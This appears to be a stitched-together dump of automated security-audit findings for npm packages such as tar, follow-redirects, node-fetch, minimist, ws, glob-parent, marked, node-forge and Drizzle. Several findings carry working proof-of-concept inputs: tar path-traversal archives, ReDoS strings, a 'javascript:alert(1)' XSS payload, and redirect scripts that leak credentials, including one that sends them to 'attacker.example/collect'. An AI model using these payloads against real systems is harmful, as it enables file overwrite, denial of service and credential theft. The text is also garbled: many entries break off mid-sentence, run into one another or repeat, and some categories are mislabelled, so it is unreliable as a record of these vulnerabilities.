And lib/strip-absolute-path.js uses `path.win32.isAbsolute()`/`parse().root` stripping but historically missed unsafe Windows-relative forms covered by advisory GHSA-5955-9wpr-37jh.

PoC approach on Windows: craft tar entry names using drive-relative/rooted Windows paths that avoid `..` segments but resolve outside cwd during extraction.
Response: Source confirms the vulnerable logic exists in 6.1.8 and there is no additional containment check such as `resolved.startsWith(cwd)` after resolution. The only defenses are:
- reject explicit `..` path segments
- strip detected absolute roots
These are insufficient on Windows according to the published advisory affecting `6.0.0` through `6.1.8` inclusive and fixed in `6.1.9`.
Analysis: This is a meaningful, reachable arbitrary file overwrite bug for users extracting untrusted tarballs on Windows with default settings. The sink is direct filesystem write/link creation at `entry.absolute`. Because extraction APIs are the package's primary public surface, exploitation is straightforward in common usage. This is a confirmed known vulnerability affecting the exact installed version, not a theoretical concern.

Title: Proxy-Authorization header is forwarded across cross-host redirects
Category: information-disclosure
Severity: medium
Description: follow-redirects@1.14.7 strips `Authorization` and `Cookie` headers when a redirect crosses to a different host, but it does not strip `Proxy-Authorization`. In `index.js` `_processResponse`, after parsing the redirect target with `url.parse`, the library only calls `removeMatchingHeaders(/^(?:authorization|cookie)$/i, this._options.headers);`. Any existing `Proxy-Authorization` header remains in `this._options.headers` and is automatically sent to the redirected host. An attacker controlling an
Request: const req = followRedirects.http.get({ protocol:'http:', hostname:'127.0.0.1', port:<attacker1>, path:'/', headers:{ 'Proxy-Authorization':'Basic SECRET', 'Authorization':'Bearer TOPSECRET', 'Cookie':'sid=abc' }}) where attacker1 responds `302 Location: http://127.0.0.1:<attacker2>/dest`
Response: Second host receives headers: `{ "proxy-authorization": "Basic SECRET", "host": "127.0.0.1:<attacker2>", "connection": "keep-alive" }`. `Authorization` and `Cookie` are absent, proving only `Proxy-Authorization` is leaked.
Analysis: This is a real credential disclosure bug in the package itself. The vulnerable code path is reachable through the public `http.get`/`http.request` API with default redirect handling enabled. No unusual configuration is required beyond a caller setting `Proxy-Authorization`, which is a standard header in proxy deployments. A malicious origin can force a redirect to an attacker-controlled host and harvest the credential. This matches the npm advisory for versions fixed in 1.15.6.

Title: Cross-domain redirect leaks Authorization and Cookie to sibling subdomains
Category: information-disclosure
Severity: medium
Description: follow-redirects@1.14.7 treats any redirect target that is a subdomain of the original host as same-origin for credential retention. In `index.js`, `_processResponse` preserves sensitive headers when `redirectUrlParts.host === currentHost || isSubdomainOf(redirectUrlParts.host, currentHost)`. This logic is reversed for security purposes: if the original request is sent to `example.com`, a redirect to `attacker.example.com` is considered safe and the library forwards `Authorization` and `Cookie` 
Request: Vulnerable code path in `_processResponse`: `if (!(redirectUrlParts.host === currentHost || isSubdomainOf(redirectUrlParts.host, currentHost))) { removeMatchingHeaders(/^(?:authorization|cookie)$/i, this._options.headers); }` where original host is `example.com` and redirect target is `attacker.example.com`.
Response: By inspection, `isSubdomainOf('attacker.example.com','example.com')` returns true, so the negated condition is false and `Authorization`/`Cookie` are retained across the redirect. Thus the redirected request will include secrets on `attacker.example.com`.
Analysis: This is a package-level information disclosure vulnerability in the default redirect-following path. The attacker only needs control over a redirecting endpoint on the parent domain or any application behavior that follows such redirects. Because browsers and HTTP clients treat subdomains as different origins, forwarding credentials across that boundary is unsafe. This corresponds to the known advisory fixed in 1.14.8.

Title: Denial of service via inherited Object prototype property names as CLI options
Category: security-misconfiguration
Severity: medium
Description: minimist@1.2.5 crashes when parsing long option names that resolve to inherited properties on the internal `aliases` object, such as `constructor`, `toString`, `valueOf`, `hasOwnProperty`, `__defineGetter__`, and `__lookupGetter__`. In `index.js`, `aliases` is created as a normal object (`var aliases = {}`), and later `setArg()` executes `(aliases[key] || []).forEach(...)`. When `key` is an inherited Object prototype property like `constructor`, `aliases[key]` resolves to the built-in function `
Request: parse(['--constructor','x']) / parse(['--toString','x']) against minimist@1.2.5
Response: ["--constructor","x"] ERR (aliases[key] || []).forEach is not a function
["--toString","x"] ERR (aliases[key] || []).forEach is not a function
["--valueOf","x"] ERR (aliases[key] || []).forEach is not a function
["--hasOwnProperty","x"] ERR (aliases[key] || []).forEach is not a function
["--__defineGetter__","x"] ERR (aliases[key] || []).forEach is not a function
["--__lookupGetter__","x"] ERR (aliases[key] || []).forEach is not a function
Analysis: The crash stems from prototype inheritance on the `aliases` map. Because `aliases` is not created with a null prototype and lookup uses `aliases[key]` without an own-property check, attacker-chosen option names can retrieve built-in Object prototype members. `setArg()` assumes `aliases[key]` is either falsy or an array and unconditionally calls `.forEach`, producing an uncaught TypeError. This is a real, directly reachable denial-of-service bug in the parser's main exported function.

Title: Sensitive headers are forwarded across cross-origin redirects
Category: information-disclosure
Severity: high
Description: node-fetch 2.6.6 automatically follows redirects and reuses the original request headers without filtering credentials or other sensitive headers when the redirect target changes origin/protocol. In `lib/index.js`, the redirect handler builds `requestOpts` using `headers: new Headers(request.headers)` and then recursively calls `fetch(new Request(locationURL, requestOpts))`. There is no same-origin check and no stripping of `Authorization`, `Cookie`, `Cookie2`, or similar sensitive headers befor
Request: Public API: `fetch(url, opts)` with default `redirect: 'follow'`. Code path in `/tmp/pwnkit-audit-4c47df27/node_modules/node-fetch/lib/index.js` lines ~1493-1560: on redirect, `const requestOpts = { headers: new Headers(request.headers), ... }` and then `resolve(fetch(new Request(locationURL, requestOpts)));` with no origin comparison or header scrubbing.
Response: Relevant vulnerable code in `lib/index.js`:
- Redirect detected: `if (fetch.isRedirect(res.statusCode)) {`
- New redirected request copies headers wholesale: `headers: new Headers(request.headers),`
- Redirect followed to resolved target: `resolve(fetch(new Request(locationURL, requestOpts)));`
No code checks whether `locationURL` points to a different hostname/protocol/port, and no code removes sensitive headers before sending the next request.
Analysis: This is directly exploitable in common usage because `redirect` defaults to `follow`. Many applications attach bearer tokens, API keys, session cookies, or internal auth headers to requests made with node-fetch. If the first server responds with `302 Location: https://attacker.example/collect`, node-fetch will resend the original headers to the attacker-controlled destination. Title: Hardlink path traversal on extraction via unchecked linkpath resolution
Category: path-traversal
Severity: high
Description: In tar@6.1.8, extracting an archive containing a hardlink entry (`type === 'Link'`) can create a hardlink to an arbitrary filesystem target outside the intended extraction directory. The vulnerable path is `lib/unpack.js`: `entry.linkpath` is not validated for `..` components or absolute roots in `CHECKPATH`, and `HARDLINK` later resolves it with `path.resolve(this.cwd, entry.linkpath)` before calling `fs.link()`.

Request: Extract a tar archive with a hardlink entry whose `path` is `inside/owned` and whose `linkpath` is `../../target_outside_cwd`. Call `tar.x({ cwd: <sandbox> })` on tar@6.1.8.
Response: Source evidence from `lib/unpack.js`:
- `CHECKPATH` rejects `..` only in `entry.path` (lines 228-236) and strips absolute roots only from `entry.path` (lines 238-247).
- No equivalent validation is performed for hardlink `entry.linkpath`.
- `HARDLINK` resolves attacker-controlled `entry.linkpath` against extraction cwd: `const linkpath = normPath(path.resolve(this.cwd, entry.linkpath))` (lines 473-475).
- The resolved path is then passed directly to `fs.link(linkpath, entry.absolute, ...)` via `LINK` (lines 617-626).
Analysis: This is a real path traversal because attacker-controlled archive metadata flows from tar parsing into `entry.linkpath`, bypasses path sanitization, is converted to an absolute path with `path.resolve(this.cwd, entry.linkpath)`, and is used in a filesystem sink (`fs.link`). The destination `entry.absolute` remains inside the extraction tree, so default path checks on `entry.path` do not mitigate the issue. Title: Symlink traversal breakout when extracting with unlink:true

Description: tar@6.1.8 can be forced to extract through attacker-controlled symbolic links when the caller enables `unlink:true`, resulting in writes outside the intended extraction directory. The vulnerable logic is in `lib/mkdir.js` and `lib/unpack.js`.

Normally, parent-directory creation rejects symbolic links in the extraction path. However, in `mkdir.js`, when a path component already exists and is a symlink, the code checks `unlink` before checking `st.isSymbolicLink()`. With `unlink:true`, it execute
Request: Invoke `tar.x({ cwd: <dest>, unlink: true })` on an archive or destination tree where an intermediate path component in an extracted entry is a symbolic link. The package will unlink the symlink and continue extraction rather than aborting.
Response: Source evidence:
- `lib/unpack.js` constructor comment: `this.unlink = !!opt.unlink` and comment lines 177-179: `unlink files and links before writing. This breaks existing hard links, and removes symlink directories rather than erroring`.
- `lib/mkdir.js` async path: if `fs.lstat(part)` reveals a non-directory and `unlink` is true, code calls `fs.unlink(part)` then `fs.mkdir(part)` (lines 114-119); only afterwards, in the `else if`, would it raise `new SymlinkError(...)` for symlinks (lines 120-121).
- Thus symlink path components are deleted and replaced instead of being rejected whenever `unlink:true` is set.
Analysis: The package contains an explicit symlink-path safety check meant to prevent archive extraction from traversing attacker-controlled symlinks. But `unlink:true` disables this protection by prioritizing deletion of any non-directory path component, including symlinks, before the symlink check. In real applications, `unlink:true` is a documented/available API option and may be used to ensure replacement extraction. Title: quote() fails to escape leading alphabetic metacharacters due to `[A-z]` range bug, enabling shell command injection
Category: command-injection
Severity: critical
Description: The public `quote(xs)` API in `index.js` attempts to preserve Windows drive-letter prefixes using the regex `String(s).replace(/([A-z]:)?([#!"$&'()*,:;<=>?@\[\\\]^`{|}])/g, '$1\\$2')`. The character class `[A-z]` is broader than `[A-Za-z]` and incorrectly matches non-letter ASCII characters between `Z` and `a` (such as `[`, `\\`, `]`, `^`, `_`, and `` ` ``). Title: Prototype pollution in updateLocale() via __proto__ key
Category: prototype-pollution
Severity: high
Description: The public API `y18n.updateLocale(obj)` copies attacker-controlled properties into the active locale object using a raw `for (var key in obj) { this.cache[this.locale][key] = obj[key] }`. This allows an attacker controlling the object passed to `updateLocale()` to inject inherited properties into the locale map and tamper with lookups performed 
Request: const y18n = require('y18n')({updateFiles:false});

Assigning `localeObj['__proto__'] = value` mutates the prototype chain of the locale object instead of creating a normal property. Because translation lookups later read `this.cache[this.locale][str]` and `this.cache[this.locale][singular]`, polluted inherited properties affect runtime behavior. Title: Denial of service via quadratic Sec-WebSocket-Protocol header parsing in server handshake

Description: `WebSocketServer.completeUpgrade()` in `lib/websocket-server.js` parses the client-supplied `Sec-WebSocket-Protocol` header using `protocol.trim().split(/ *, */)`. In ws@7.4.5, this regex-based split is applied directly to attacker-controlled handshake input before the connection is rejected or accepted. Request: GET / HTTP/1.1\r\nHost: target\r\nUpgrade: websocket\r\nConnection: Upgrade\r\nSec-WebSocket-Key: dGhlIHNhbXBsZSBub25jZQ==\r\nSec-WebSocket-Version: 13\r\nSec-WebSocket-Protocol: ' + (', '.repeat(100000)) + 'A\r\n\r\n

```js
let protocol = req.headers['sec-websocket-protocol'];
if (protocol) {

```

The regex `/ *, */` contains ambiguous repetitions around spaces and commas and was publicly fixed in 7.4.6 due to ReDoS. Because parsing occurs synchronously on Node's main thread, a single crafted request can monopolize CPU and delay or deny service to other clients. This is a real

Title: Unsafe default rendering of javascript:/data:/vbscript: links enables XSS in common marked usage Category: xss Severity: medium Description: By default, marked 2.0.0 renders untrusted Markdown links and images into HTML without sanitizing dangerous URI schemes. `Renderer.link()` and `Renderer.image()` call `cleanUrl()` with `this.options.sanitize`, but the default in `src/defaults.js` is `sanitize: false`. Reachable path: - public API `marked(src)` - `Parser.parseInline()` Request: const marked = require('./src/marked'); console.log(marked('[x](javascript:alert(1))')); console.log(marked('![alt](javascript:alert(1))')); Response:

x

Analysis: The output HTML contains attacker-controlled `javascript:` URIs. Because this occurs with the package's default configuration and the package is widely used to render untrusted Markdown into browser DOM, this is a real XSS-enabling unsafe default. Although marked documents sanitization separately, the code path itself demonstrates that dangerous URIs are emitted directly unless the caller opts into deprecated `sanitize` behavior or performs external sanitization.

Title: Proxy-Authorization header leaks across redirects to a different origin
Category: information-disclosure
Severity: medium
Description: In follow-redirects@1.14.7, the redirect handling code strips only `Authorization` and `Cookie` when a redirect crosses host boundaries, but fails to remove `Proxy-Authorization`. In `index.js`, `_processResponse()` removes `Host`, resolves the redirect target, and conditionally calls `removeMatchingHeaders(/^(?:authorization|cookie)$/i, this._options.headers);`. Because `Proxy-Authorization` is omitted from that filter, a credential-bearing proxy header set on the initial request is automatical
Request: PoC script executed locally against follow-redirects@1.14.7:

Initial request:
```js
const fr=require('follow-redirects');
fr.http.get({
 protocol:'http:', hostname:'127.0.0.1', port:18084, path:'/',
 headers: {
   'Proxy-Authorization': 'Basic U0VDUkVU',
   'Authorization': 'Bearer A',
   'Cookie': 'a=b'
 }
}, res=>{ res.resume(); });
```
Server on :18084 responds with `302 Location: http://127.0.0.1:18085/x`.
Server on :18085 records received headers.
Response: Observed headers on redirected request to second origin:
```json
{
  "Proxy-Authorization": "Basic U0VDUkVU",
  "Host": "127.0.0.1:18085",
  "Connection": "keep-alive"
}
```
`Authorization` and `Cookie` were absent, but `Proxy-Authorization` was preserved across the cross-origin redirect.
Analysis: This is exploitable because the package automatically follows redirects by default and copies headers from the original request into subsequent requests. The code explicitly attempts to prevent credential leakage on cross-domain redirects, which shows the intended security boundary, but the regex only matches `authorization|cookie` and misses `Proxy-Authorization`. As a result, applications using authenticated proxies or that otherwise set this header can disclose sensitive proxy credentials to

Title: Extended query parsing enables inherited-property injection via allowPrototypes:true
Category: prototype-pollution
Severity: medium
Description: Express 5.2.1 configures its built-in "extended" query parser with `qs.parse(str, { allowPrototypes: true })` in `lib/utils.js`. When an application enables `app.set('query parser', 'extended')`, attacker-controlled query string keys matching Object prototype property names are preserved instead of being blocked by qs's default protections. This means requests can inject properties such as `hasOwnProperty`, `toString`, or `constructor` onto `req.query`, altering application logic that treats `re
Request: lib/utils.js -> parseExtendedQueryString(str) { return qs.parse(str, { allowPrototypes: true }); }
lib/request.js -> defineGetter(req, 'query', function query(){ ... var querystring = parse(this).query; return queryparse(querystring); });
Response: `parseExtendedQueryString` in `lib/utils.js` explicitly enables `allowPrototypes: true`, and `req.query` in `lib/request.js` passes the raw URL query string into the configured parser with no filtering.
Analysis: `allowPrototypes: true` is specifically the qs option that disables its defense against user input overwriting prototype-named properties. While modern qs prevents `__proto__` prototype chain mutation, allowing inherited property names is still security-relevant because many Express apps branch on `req.query.foo`, use `in` / truthiness checks, or call methods like `req.query.hasOwnProperty(...)`. A request like `/?hasOwnProperty=1` can replace that method with a string and crash or bypass guards

Title: Arbitrary code execution through _.template compilation of attacker-controlled templates

Request: Public API flow: `template(string, options, guard)` in template.js accepts a template string. Delimiters such as `<% ... %>` and `<%= ... %>` are copied into generated JavaScript source. The code then does `return Function(importsKeys, sourceURL + 'return ' + source).apply(undefined, importsValues);`.
Response: Relevant code in `template.js`:
- For evaluate blocks: `source += "';\n" + evaluateValue + ";\n__p += '";`
- For interpolate blocks: `source += "' +\n((__t = (" + interpolateValue + ")) == null ? '' : __t) +\n'";`
- Compilation sink: `return Function(importsKeys, sourceURL + 'return ' + source).apply(undefined, importsValues);`

Analysis: This is direct code injection when untrusted input reaches the exported `template` API. While template engines are often expected to execute trusted templates, many real applications compile templates from user-editable themes, CMS content, emails, or database fields. Title: Denial of service when parse() receives a string instead of argv array
Category: security-misconfiguration
Severity: medium
Description: The public API exports a single parse function that expects an argv-style array, but it does not validate the input type before using array methods and array-only iteration semantics. When a string is supplied, `args.indexOf('--')` and `args.slice()` succeed because strings implement those methods, but later `notFlags.forEach(...)` is executed on a string, causing an uncaught `TypeError: notFlags.forEach is not a function`. This creates a reachable crash for applications that pass attacker-contr
Request: const parse = require('minimist'); parse('--foo bar');
Response: TypeError: notFlags.forEach is not a function
Analysis: This is a real availability bug in the package's only public API. The function processes string input far enough that callers may reasonably expect it to work, then crashes late in parsing. Because the package is frequently used on data derived from user-controlled command strings in CLI wrappers, this can be used to terminate a Node.js process if the exception is not caught. Impact is denial of service, not code execution, so medium severity is appropriate.

Title: Certificate chain verification accepts non-CA parent certificates in common cases
Category: information-disclosure
Severity: high
Description: `pki.verifyCertificateChain()` in `lib/x509.js` only enforces CA constraints on certificates that are not the first certificate in the chain, or on a sole/self-signed certificate: `if(error === null && (!first || (chain.length === 0 && (!parent || selfSigned)))) { ... }`. During normal validation of a leaf certificate signed directly by a trust anchor from the CA store, the loop processes the leaf first with `first === true`, `parent` set from `caStore.getIssuer(cert)`, and `chain.length === 0`,
Request: Construct a CA store containing a certificate T that is trusted by subject hash but is not marked as a CA (no `basicConstraints` cA=true, no `keyUsage.keyCertSign`). Create a leaf certificate L signed by T. Call `forge.pki.verifyCertificateChain(caStore, [L])`.
Response: In `verifyCertificateChain`, the first and only iteration handles `L` with `first === true`, `parent = caStore.getIssuer(L)`, and `chain.length === 0`. The CA enforcement block only runs when `!first` OR `(chain.length === 0 && (!parent || selfSigned))`. Because `parent` exists and `selfSigned` is false, the block does not run, so no check is performed that trusted signer `T` is actually a CA. Signature verification succeeds and the chain is accepted.
Analysis: This is a real certificate validation bypass. Many applications rely on node-forge to decide whether a chain is valid. Accepting a non-CA trusted certificate as a signer breaks PKI semantics and can let an attacker with access to any trusted end-entity/private key mint apparently valid subordinate certs. The bug is directly visible in control flow and matches the later upstream advisory/fix line.

Title: Arbitrary file overwrite on extraction via insufficient absolute path sanitization
Category: path-traversal
Severity: high
Description: The extraction logic in tar@4.4.12 does not robustly sanitize attacker-controlled entry paths before converting them into filesystem destinations. In `lib/unpack.js`, `CHECKPATH` only partially strips absolute roots when `preservePaths` is false, and then computes the write target with `entry.absolute = path.resolve(this.cwd, entry.path)`. This version is in the publicly affected range for absolute path traversal. A malicious tar archive can supply crafted absolute-style paths so that extracted 
Request: Archive entry path supplied by attacker, processed through `Unpack` extraction flow. Relevant code in `lib/unpack.js`:

```js
if (!this.preservePaths) {
  const p = entry.path
  if (p.match(/(^|\/|\\)\.\.(\\|\/|$)/)) {
    this.warn('path contains \'..\'', p)
    return false
  }
  if (path.win32.isAbsolute(p)) {
    const parsed = path.win32.parse(p)
    this.warn('stripping ' + parsed.root + ' from absolute path', p)
    entry.path = p.substr(parsed.root.length)
  }
}
...
if (path.isAbsolute(entry.path))
  entry.absolute = entry.path
else
  entry.absolute = path.resolve(this.cwd, entry.path)
```
Response: Code review confirms attacker-controlled tar header paths flow directly into `entry.absolute`, which is then used by sinks such as:

```js
const stream = new fsm.WriteStream(entry.absolute, { ... })
fs.mkdir(entry.absolute, ...)
fs[link](linkpath, entry.absolute, ...)
```

This package version (4.4.12) is explicitly within the vulnerable range for CVE-2021-32804 / GHSA-3jfq-g458-7qm9, and the vulnerable extraction code path is present and reachable in the installed source.
Analysis: This is a real arbitrary file write/overwrite issue in a common API (`tar.x` / `extract` / `Unpack`) operating on attacker-controlled archives. The vulnerability is exploitable when applications extract untrusted tarballs, which is a standard usage pattern for this package. Because the sink is direct filesystem creation/overwrite outside the intended directory, impact is high.

Title: Regular Expression Denial of Service in enclosure regex
Category: regex-dos
Severity: medium
Description: The package's only public API, `globParent(str, opts)`, applies the regex `enclosure = /[\{\[].*[\/]*.*[\}\]]$/` to attacker-controlled input before any normalization or length checks. This pattern contains overlapping greedy wildcards (`.*[\/]*.*`) and is evaluated with `.test(str)`. Inputs beginning with `[` or `{` and lacking a closing `]`/`}` trigger catastrophic backtracking, causing the function to block the Node.js event loop for seconds on relatively small strings. Because `glob-parent` 
Request: Public API call: `globParent('[' + '/'.repeat(2000)))` against glob-parent@5.1.0
Response: Measured directly from the installed package source:
- benign input `src/*.js`: enclosure regex 0.036 ms, full call 0.325 ms
- malicious input `'[' + '/'.repeat(1000)`: enclosure regex 361.268 ms, full call 361.659 ms
- malicious input `'[' + '/'.repeat(2000)`: enclosure regex 2859.852 ms, full call 2859.842 ms
This shows super-linear/catastrophic growth from a 2 KB string and confirms the slowdown happens in `enclosure.test(str)`.
Analysis: Code review of `index.js` shows the vulnerable path is unconditionally reachable from the exported function:
1. `module.exports = function globParent(str, opts) { ... }`
2. `if (enclosure.test(str)) { str += '/'; }`
3. `enclosure` is `/[\{\[].*[\/]*.*[\}\]]$/`

Title: node-fetch 2.6.6 forwards sensitive headers across cross-origin redirects
Category: information-disclosure
Severity: high
Description: The redirect-following logic in lib/index.js copies the original request headers verbatim into the redirected request without checking whether the redirect target is a different origin or a downgrade from HTTPS to HTTP. In fetch(), when a 3xx response is received and redirect mode is 'follow', it creates requestOpts with `headers: new Headers(request.headers)` and immediately calls `fetch(new Request(locationURL, requestOpts))`. There is no filtering of sensitive headers such as Authorization, C
Request: In lib/index.js, the redirect path in fetch() constructs `const requestOpts = { headers: new Headers(request.headers), ... }` and then executes `resolve(fetch(new Request(locationURL, requestOpts)));` without stripping sensitive headers on cross-origin/protocol-changing redirects.
Response: Relevant code from lib/index.js:

- Redirect handling begins around lines 1501+.
- `const locationURL = location === null ? null : resolve_url(request.url, location);`
- In follow mode it creates:
  `const requestOpts = { headers: new Headers(request.headers), follow: request.follow, counter: request.counter + 1, agent: request.agent, compress: request.compress, method: request.method, body: request.body, signal: request.signal, timeout: request.timeout, size: request.size }`
- Then it follows the redirect with:
  `resolve(fetch(new Request(locationURL, requestOpts)));`

No origin comparison or header scrubbing exists anywhere in this flow.
Analysis: Attacker-controlled input enters through the response Location header of any URL fetched by applications using node-fetch. Because the library automatically follows redirects by default (`redirect: 'follow'`) and clones the original headers into the next request unchanged, credentials are disclosed to the redirect destination. This is directly exploitable in default/common usage whenever callers attach secrets in headers, which is a common pattern for API clients. The impact is theft of bearer t

Title: Regular expression denial of service in enclosure detection
Category: regex-dos
Severity: medium
Description: The exported `globParent(str, opts)` function applies the regex `var enclosure = /[\{\[].*[\/]*.*[\}\]]$/;` directly to attacker-controlled input before any length checks or parsing. This pattern contains overlapping greedy wildcards (`.*[\/]*.*`) anchored near the end of the string, which causes catastrophic backtracking when the input begins with `[` or `{`, contains many `/` characters, and lacks a closing `]` or `}`. Because `glob-parent` is commonly used in build tools, file watchers, and s
Request: const gp = require('glob-parent'); gp('[' + '/'.repeat(2000) + '{'.repeat(2000));
Response: Measured locally against the audited package version 5.1.1: n=2000 took 11918.208 ms, n=4000 took 94747.438 ms. The slowdown occurs before any other meaningful processing, inside `enclosure.test(str)` in `index.js`.
Analysis: `globParent` is the sole public API and takes an arbitrary string. The vulnerable regex is evaluated unconditionally on that string. The benchmark shows attacker-controlled inputs can consume ~12 seconds of CPU with a 4 KB payload and ~95 seconds with an 8 KB payload, demonstrating practical denial of service. There are no mitigations in this version; the issue is reachable in default usage and matches the known advisory fixed in 5.1.2.

Title: Regular expression denial of service in Sec-WebSocket-Protocol parsing
Category: regex-dos
Severity: medium
Description: ws@7.4.5 parses the client-supplied `Sec-WebSocket-Protocol` header during server-side handshake using `protocol.trim().split(/ *, */)` in `lib/websocket-server.js`. The separator regex contains overlapping quantified spaces on both sides of a comma, which is the known vulnerable code path fixed in later releases. A remote attacker can send a crafted upgrade request with a very long `Sec-WebSocket-Protocol` header containing many spaces and no valid comma placement, causing excessive regex backt
Request: Remote upgrade request with a malicious `Sec-WebSocket-Protocol` header reaches `WebSocketServer.completeUpgrade()`, where the code executes: `protocol = protocol.trim().split(/ *, */);`
Response: In `lib/websocket-server.js`, `completeUpgrade()` contains:

`let protocol = req.headers['sec-websocket-protocol'];`
`if (protocol) {`
`  protocol = protocol.trim().split(/ *, */);`
`  ...`
`}`

This is attacker-controlled header data processed by the vulnerable regex.
Analysis: The header value is fully attacker-controlled in an HTTP Upgrade request. The regex `/ *, */` is evaluated over arbitrarily long input before any protocol validation or application callback runs. Because this occurs on the main Node.js thread during handshake processing, a single crafted request can consume CPU and delay other connections. npm audit already flags ws 7.4.5 as affected, and the vulnerable source line is present and reachable in the installed package.

Title: HTTP header count denial of service during WebSocket upgrade handling
Category: information-disclosure
Severity: medium
Description: ws@7.4.5 is affected by the known DoS issue where handling upgrade requests with many HTTP headers can exhaust CPU/resources before a websocket is established. The package hooks the HTTP server `upgrade` event and immediately processes `req.headers`, including extension and protocol negotiation, for every upgrade request in `lib/websocket-server.js`. In affected Node.js/ws combinations, an attacker can send an upgrade request with an excessive number of headers and cause resource exhaustion, imp
Request: A remote client sends an HTTP Upgrade request with a very large number of headers to a server using `new WebSocket.Server(...)`. The request is passed to `handleUpgrade(req, socket, head, cb)` and processed via `req.headers` lookups such as `req.headers.upgrade`, `req.headers['sec-websocket-key']`, `req.headers['sec-websocket-version']`, and optional extension parsing.
Response: `lib/websocket-server.js` registers an `upgrade` listener and calls `handleUpgrade(req, socket, head, emitConnection)`. `handleUpgrade()` immediately accesses attacker-controlled `req.headers` fields and processes them before any application-level rate limiting. This installed package version matches the advisory-affected range `7.0.0 - 7.5.9`.
Analysis: This is a publicly known availability issue affecting this exact package version range. The vulnerable code path is reachable in default server deployments because any HTTP upgrade request triggers `handleUpgrade()`. While the root cause involves handling of many headers in upgrade requests rather than a memory corruption bug, it is still a real remotely triggerable DoS impacting users of ws 7.4.5. I rated it medium because impact is event-loop/resource exhaustion rather than code execution.

Title: Proxy-Authorization header is leaked across cross-host redirects
Category: information-disclosure
Severity: medium
Description: In follow-redirects@1.14.7, RedirectableRequest.prototype._processResponse only strips `authorization` and `cookie` headers when a redirect changes hosts. It does not strip `Proxy-Authorization`. As a result, credentials intended for an upstream proxy are automatically resent to the destination server after a cross-host redirect. Any application using this library with a `Proxy-Authorization` header can leak proxy credentials to an attacker-controlled redirect target.

Response: The second server received:
{
  "headers": {
    "proxy-authorization": "Basic SECRET",
    "host": "127.0.0.1:40207",
    "connection": "keep-alive"
  }
}
`Authorization` and `Cookie` were stripped, but `Proxy-Authorization` was forwarded to the redirected host.

Title: Authorization header can be reintroduced to attacker-controlled host via userinfo in redirect URL

Severity: medium
Description: In follow-redirects@1.14.7, cross-host redirects attempt to scrub sensitive headers by removing `Authorization` and `Cookie` when the redirect target is not the same domain or a subdomain. Request: A local PoC created two HTTP servers. Server 1 responded with `302 Location: http://good.com\t@127.0.0.1:<port>/x` to an initial request carrying `Authorization: Bearer TOK` and `Cookie: a=b` via `follow-redirects.http.get(...)`.

    "host": "127.0.0.1:38443",

Title: Cache-Control parser ReDoS via catastrophic backtracking in split(/\s*=\s*/, 2)
Category: regex-dos
Severity: medium
Description: The package parses attacker-controlled Cache-Control headers in parseCacheControl(). For each comma-separated directive, it executes `part.split(/\s*=\s*/, 2)`. In version 4.1.0 this regular expression is vulnerable to catastrophic backtracking on crafted inputs containing a very long run of whitespace followed by an extra `=`. Because Cache-Control values are network-supplied headers, a remote attacker can send a malicious response header (or request header in `satisfiesWithoutRevalidation()`) 
Request: Construct `new CachePolicy(req, {status:200, headers:{'cache-control':'a=' + ' '.repeat(200000) + '='}})` or call `policy.satisfiesWithoutRevalidation({headers:{host:'x','cache-control':'a=' + ' '.repeat(200000) + '='}})`. The vulnerable code path is `parseCacheControl()` in index.js lines 76-85, specifically `part.split(/\s*=\s*/, 2)`.
Response: A local Node.js reproduction invoking the constructor with the crafted header did not complete within the 30 second execution timeout, indicating pathological regex processing. Relevant source:
- index.js:82 `const parts = header.trim().split(/\\s*,\\s*/);`
- index.js:84 `const [k, v] = part.split(/\\s*=\\s*/, 2);`
Analysis: This is a real, exploitable denial-of-service bug. The package is specifically designed to consume HTTP headers from untrusted peers. An attacker only needs to deliver a malicious Cache-Control header to trigger synchronous parsing on the application thread. Because Node.js is single-threaded for JS execution, the regex backtracking can block the event loop and stall request processing. Description: Drizzle ORM executes migration SQL statements using `sql.raw(stmt)` with no parsing, parameterization, or safety checks. The vulnerable paths include `pg-core/dialect.js` (`await tx.execute(sql.raw(stmt));`), `mysql-core/dialect.js`, `singlestore-core/dialect.js`, and `neon-http/migrator.js`. Migration files are loaded from disk by `migrator.js`, split on `--> statement-breakpoint`, and each resulting string is executed verbatim.

If an application accepts or syncs migration files from an attack

- migrator.js reads `${migrationFolderTo}/${journalEntry.tag}.sql` and returns raw SQL strings.
- pg-core/dialect.js: `for (const stmt of migration.sql) { await tx.execute(sql.raw(stmt)); }`
- neon-http/migrator.js: `for (const stmt of migration.sql) { await db.session.execute(sql.raw(stmt)); }`
- mysql-core/dialect.js and singlestore-core/dialect.js use the same pattern.

- reads attacker-influenced `.sql` files from `config.migrationsFolder`
- `const result = query.split("--> statement-breakpoint")`
- returns `{ sql: result, ... }`

`pg-core/dialect.js`:
- `for (const stmt of migration.sql) { await tx.execute(sql.raw(stmt)); }`

`neon-http/migrator.js`:
- `for (const stmt of migration.sql) { await db.session.execute(sql.raw(stmt)); }`

`sql/sql.js`:
- `sql.raw(str) { return new SQL([new StringChunk(str)]); }`
This embeds the string directly into the final query text.
Analysis: This is a direct raw-SQL sink. Unlike the normal query builder, `sql.raw()` does not escape or parameterize input; it wraps attacker-controlled text as a literal query chunk. `readMigrationFiles()` obtains the SQL from external files under a caller-supplied folder path and passes each chunk to the sink.
